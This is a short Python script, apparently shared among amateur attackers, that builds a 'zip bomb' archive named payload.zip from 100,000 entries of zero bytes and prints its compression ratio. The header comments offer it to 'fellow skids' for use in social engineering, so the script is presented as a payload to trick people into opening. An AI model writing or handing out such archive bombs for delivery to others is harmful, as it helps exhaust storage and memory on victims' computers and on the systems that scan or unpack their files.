# wacky but works
# fellow skids use with caution thanks i am not responsible for your dogshit social engineering

"zip64bomb"
import zipfile
import io
import os

def make_zip_bomb(output_path, num_files=10000, file_size=1000):
    payload = b'\x00' * file_size  # highly compressible data
    
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for i in range(num_files):
            info = zipfile.ZipInfo(f'file_{i:06d}.dat')
            info.date_time = (2027, 1, 1, 0, 0, 0)
            zf.writestr(info, payload)
    
    size = os.path.getsize(output_path)
    ratio = (num_files * file_size) / size
    print(f"[+] Created: {output_path}")
    print(f"    Compressed: {size:,} bytes")
    print(f"    Uncompressed: {num_files * file_size:,} bytes")
    print(f"    Ratio: {ratio:.2f}:1")

if __name__ == "__main__":
    make_zip_bomb("payload.zip", num_files=100_000, file_size=4096)
